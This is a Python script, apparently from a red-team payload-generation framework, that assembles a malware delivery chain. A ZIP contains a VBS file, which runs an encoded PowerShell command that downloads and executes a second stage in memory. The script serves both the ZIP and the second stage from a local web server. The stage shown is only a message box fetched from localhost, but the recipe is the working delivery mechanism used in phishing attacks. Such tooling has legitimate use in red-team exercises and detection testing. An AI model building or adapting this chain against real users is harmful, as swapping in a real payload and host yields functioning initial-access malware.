from make.htmlsmuggling.htmlsmuggling import makeHtmlSmuggling
from make.lnk.lnk import makeLnk
from make.iso.iso import makeIso
from make.powershell.powershell import *
from make.zip.zip import makeZip
from make.vbs.vbs import *
from make.mshta.mshta import *
from make.onenote.onenote import *
from make.bat.bat import *

from helpers import readFileContent, saveAceFile, makeAceFile
from model import AceFile, AceRoute
from web import serve


def recipe_2():
    # ZIP -> VBS -> Powershell:Download+Exec <- Powershell-Messagebox
    routes = []

    # PS-A
    ps1msgbox: AceStr = makePowershellMessageBox()
    ps1msgboxHtml: AceRoute = AceRoute('/ps-msgbox', ps1msgbox)
    routes.append(ps1msgboxHtml)

    # PS-B
    ps1downloader: AceStr = makePowershellDownloadAndExecuteMemPs1(
        url='http://localhost:5000/ps-msgbox',
    )

    # VBS
    ps1downloader: AceStr = makePowershellEncodedCommand(ps1downloader)
    vbsExec: AceStr = makeVbsExecEncPs1(ps1downloader)
    vbsExecFile: AceFile = makeAceFile('test.vbs', vbsExec)

    # ZIP
    container: AceBytes = makeZip(
        files = [
            vbsExecFile,
        ],
    )
    containerServe: AceRoute = AceRoute('/test.zip', container, download=True, downloadName='test.zip')
    routes.append(containerServe)

    # start
    serve(routes)
